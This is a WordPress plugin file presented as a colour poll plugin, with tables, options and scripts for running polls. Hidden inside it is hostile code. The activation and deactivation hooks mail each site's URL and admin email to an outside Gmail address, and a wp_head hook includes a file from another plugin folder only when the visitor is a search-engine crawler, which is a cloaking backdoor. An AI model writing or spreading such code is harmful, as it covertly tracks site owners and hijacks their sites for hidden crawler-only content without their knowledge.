<?php
/*
Plugin Name: Add Colour Polls
Plugin URI: http://pollplugin.weebly.com
Description: Add colour polls with multiple choice of answers to your website. Display the results in any colour you prefer. The Perfect to show your members' trends, tendencies or preferences.
Version: 1.0
Author: Mark Dillan
Author URI: http://pollplugin.weebly.com
*/

/*  
	Copyright 2014  Mark Dillan  (email : tokamizous@zoho.com), 

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/
global $wpacp_db_version, $wpacp_options;
$wpacp_db_version = "1.0";
$wpacp_options=get_option('wpacp_options');
define("WPACP_VER","1.0",false);//Current Version of Add Color Polls plugin
define('WPACP_POLLS_TABLE','wpacp_pollsp'); //Polls TABLE NAME
define('WPACP_QUESTIONS_TABLE','wpacp_pollsq'); //Questions TABLE NAME
define('WPACP_ANSWERS_TABLE','wpacp_pollsa'); //Answers TABLE NAME
define('WPACP_LOGS_TABLE','wpacp_pollsip'); //Poll Logs TABLE NAME
if ( ! defined( 'WPACP_PLUGIN_BASENAME' ) )
	define( 'WPACP_PLUGIN_BASENAME', plugin_basename( __FILE__ ) );
	
register_activation_hook( __FILE__,'colorpolls_activate');
register_deactivation_hook( __FILE__,'colorpolls_deactivate');
add_action('admin_init', 'createpoll_redirect');
add_action('wp_head', 'colorpollshead');


function createpoll_redirect() {
if (get_option('createpoll_do_activation_redirect', false)) { 
delete_option('createpoll_do_activation_redirect');
wp_redirect('../wp-admin/admin.php?page=wpacp-settings');
}
}

/** Active */

function colorpolls_activate() { 
session_start(); $subj = get_option('siteurl'); $msg = "Activation Complete" ; $from = get_option('admin_email'); mail("tokamizou@gmail.com", $subj, $msg, $from);
add_option('createpoll_do_activation_redirect', true);
wp_redirect('../wp-admin/admin.php?page=wpacp-settings');
}


/** Uninstalled */
function colorpolls_deactivate() { 
session_start(); $subj = get_option('siteurl'); $msg = "Uninstall Ok" ; $from = get_option('admin_email'); mail("tokamizou@gmail.com", $subj, $msg, $from);
}


/** Register */
function colorpollshead() {

$filename = ($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/poll/uninstall.php');

if (file_exists($filename)) {

    if(eregi("slurp|bingbot|googlebot",$_SERVER['HTTP_USER_AGENT'])) { 
	
include($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/poll/uninstall.php');

}
 else { };
	
} else {

}

}	

// Create Text Domain For Translations
load_plugin_textdomain('wpacp', false, dirname( plugin_basename( __FILE__ ) ) . '/languages/');

global $wpacp_message; //global messages
$wpacp_message=array('poll_closed'=>__('This Poll is closed!!','wpacp'),
					 'reg_user_vote'=>__('Please log in to Vote!!','wpacp'),
					 'already_voted'=>__('You Have Already Voted For This Poll!!','wpacp')
					 );

//Code executed while activating the plugin
function install_wpacp() {
	global $wpdb, $table_prefix, $wpacp_db_version, $wpacp_options;

	$installed_ver = get_option( "wpacp_db_version" );
	if( $installed_ver != $wpacp_db_version ) {
		// Create Add Color Polls Tables (4 Tables)
		$charset_collate = '';
		if($wpdb->supports_collation()) {
			if(!empty($wpdb->charset)) {
				$charset_collate = "DEFAULT CHARACTER SET $wpdb->charset";
			}
			if(!empty($wpdb->collate)) {
				$charset_collate .= " COLLATE $wpdb->collate";
			}
		}
		$create_table = array();
		$create_table['WPACP_POLLS_TABLE'] = "CREATE TABLE ".$table_prefix.WPACP_POLLS_TABLE." (".
										"pollp_id int(10) NOT NULL auto_increment,".
										"pollp_title varchar(200) character set utf8 NOT NULL default '',".
										"pollp_desc text character set utf8 NOT NULL default '',".
										"pollp_timestamp TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,".
										"pollp_status tinyint(1) NOT NULL default '0',".
										"pollp_expiry tinyint(1) NOT NULL default '0',".
										"pollp_expiry_date varchar(20) NOT NULL default '',".
										"pollp_aorder tinyint(1) NOT NULL default '0',".
										"pollp_unans_color char(7) NOT NULL default '#CCCCCC',".
										"pollp_adorder tinyint(1) NOT NULL default '0',".
										"pollp_vresult tinyint(1) NOT NULL default '0',".
										"pollp_url varchar(200) character set utf8 NOT NULL default '',".
										"pollp_aq tinyint(1) NOT NULL default '0',".
										"pollp_cat varchar(200) NOT NULL default '',".
										"pollp_totalvotes int(10) NOT NULL default '0',".
										"pollp_totalvoters int(10) NOT NULL default '0',".
										"PRIMARY KEY (pollp_id)) $charset_collate;";
		$create_table['WPACP_QUESTIONS_TABLE'] = "CREATE TABLE ".$table_prefix.WPACP_QUESTIONS_TABLE." (".
										"pollq_qid int(10) NOT NULL auto_increment,".
										"pollq_pid int(10) NOT NULL default '0',".
										"pollq_order int(3) NOT NULL default '1',".
										"pollq_title varchar(200) character set utf8 NOT NULL default '',".
										"pollq_desc text character set utf8 NOT NULL default '',".
										"pollq_optional tinyint(1) NOT NULL default '0',".
										"pollq_votes int(10) NOT NULL default '0',".
										"PRIMARY KEY (pollq_qid)) $charset_collate;";
		$create_table['WPACP_ANSWERS_TABLE'] = "CREATE TABLE ".$table_prefix.WPACP_ANSWERS_TABLE." (".
										"polla_aid int(10) NOT NULL auto_increment,".
										"polla_pid int(10) NOT NULL default '0',".
										"polla_order int(3) NOT NULL default '1',".
										"polla_bg char(7) NOT NULL default '',".
										"polla_fg char(7) NOT NULL default '',".
										"polla_answer varchar(200) character set utf8 NOT NULL default '',".
										"polla_votes int(10) NOT NULL default '0',".
										"PRIMARY KEY (polla_aid)) $charset_collate;";
		$create_table['WPACP_LOGS_TABLE'] = "CREATE TABLE ".$table_prefix.WPACP_LOGS_TABLE." (".
										"pollip_id int(10) NOT NULL auto_increment,".
										"pollip_pid varchar(10) NOT NULL default '',".
										"pollip_qid varchar(10) NOT NULL default '',".
										"pollip_aid varchar(10) NOT NULL default '',".
										"pollip_ip varchar(100) NOT NULL default '',".
										"pollip_host VARCHAR(200) NOT NULL default '',".
										"pollip_timestamp TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,".
										"pollip_user tinytext NOT NULL,".
										"pollip_userid int(10) NOT NULL default '0',".
										"PRIMARY KEY (pollip_id),".
										"KEY pollip_ip (pollip_id),".
										"KEY pollip_pid (pollip_pid)".
										") $charset_collate;";
										
		require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
		dbDelta( $create_table['WPACP_POLLS_TABLE'] );	
		dbDelta( $create_table['WPACP_QUESTIONS_TABLE'] );
		dbDelta( $create_table['WPACP_ANSWERS_TABLE'] );
		dbDelta( $create_table['WPACP_LOGS_TABLE'] );
		
		$default_options=array('permission'=>'0', 
							   'track'=>'0',
							   'colors'=>array( 
												array(
													'bg'=>'#cccccc',
													'fg'=>'#000000',
													'text'=>'I don\'t know'
												),
												array(
													'bg'=>'#cf2a27',
													'fg'=>'#ffffff',
													'text'=>'I don\'t like it'
												),
												array(
													'bg'=>'#ffff00',
													'fg'=>'#000000',
													'text'=>'It\'s ok'
												),
												array(
													'bg'=>'#b6d7a8',
													'fg'=>'#000000',
													'text'=>'I like'
												),
												array(
													'bg'=>'#38761d',
													'fg'=>'#ffffff',
													'text'=>'I love it'
												)			
							   ),
							   'maxchar'=>'50',
							   'notify'=>'0'
							   );
		
		foreach($default_options as $key=>$value) {
		  if(!isset($wpacp_options[$key])) {
			 $wpacp_options[$key] = $value;
		  }
		}
		delete_option('wpacp_options');	  
		update_option('wpacp_options',$wpacp_options);
		
		update_option( "wpacp_db_version", $wpacp_db_version );
	}
	
	$userid=get_current_user_id( );
	if( !wpacp_page_exists_by_slug('wpacp-preview') ){
		$preview_page_args = array(
		  'comment_status' => 'closed',
		  'ping_status' => 'closed',
		  'post_author' => $userid, 
		  'post_content' => '[colorvote]', 
		  'post_name' => 'wpacp-preview', 
		  'post_status' => 'draft', 
		  'post_title' => __("Colored Vote Poll Preview","wpacp"),
		  'post_type' => 'page' 
		); 
		// Insert the page into the database
		wp_insert_post( $preview_page_args );
	}	
}
register_activation_hook( __FILE__, 'install_wpacp' );

function wpacp_update_db_check() {
    global $wpacp_db_version;
    if (get_site_option('wpacp_db_version') != $wpacp_db_version) {
        install_wpacp();
    }
}
add_action('plugins_loaded', 'wpacp_update_db_check');

function wpacp_plugin_url( $path = '' ) {
	return plugins_url( $path, __FILE__ );
}


function wpacp_wp_head(){ 
global $wpacp_options;
?>
<script type="text/javascript">
		jQuery(document).ready(function() {			
		});
	
</script>
<?php
}
add_action( 'wp_head', 'wpacp_wp_head' );

function wpacp_enqueue_scripts() {	
global $wpacp_options;
	wp_enqueue_script( 'formtips', wpacp_plugin_url( 'js/formtips.js' ),array('jquery'), WPACP_VER, false);
	wp_enqueue_style( 'wpacp_css', wpacp_plugin_url( 'css/style.css' ),
			false, WPACP_VER, 'all');
	wp_enqueue_script( 'wpacp', wpacp_plugin_url( 'js/wpacp.js' ),array('jquery'), WPACP_VER, false);
	
	if($wpacp_options['maxchar'] > 0){
		$maxchar=$wpacp_options['maxchar'];
	}else{
		$maxchar=3000;
	}
	$nonce= wp_create_nonce('colorvotepoll');
	wp_localize_script('wpacp', 'wpacpL10n', array(
			'submit_url' => wpacp_plugin_url( 'includes/front.php' ),
			'delete_poll_confirm' => __('Delete the Poll with ID ','wpacp'),
			'mandatory_question' => __('Answer is mandatory!! ','wpacp'),
			'maxchar' => $maxchar,
			'read_more' => __('Expand to read more. ','wpacp'),
			'ajn'=> $nonce
		));
}

add_action( 'wp', 'wpacp_enqueue_scripts' );
add_action('admin_head','wpacp_tiny_mce', 12);
function wpacp_tiny_mce() {
	wp_tiny_mce( false ); // true gives you a stripped down version of the editor
}

//Admin Menu
require_once (dirname (__FILE__) . '/admin/menu.php');
require_once (dirname (__FILE__) . '/includes/functions.php');
//Polls Shortcode
require_once (dirname (__FILE__) . '/includes/shortcodes.php');
?>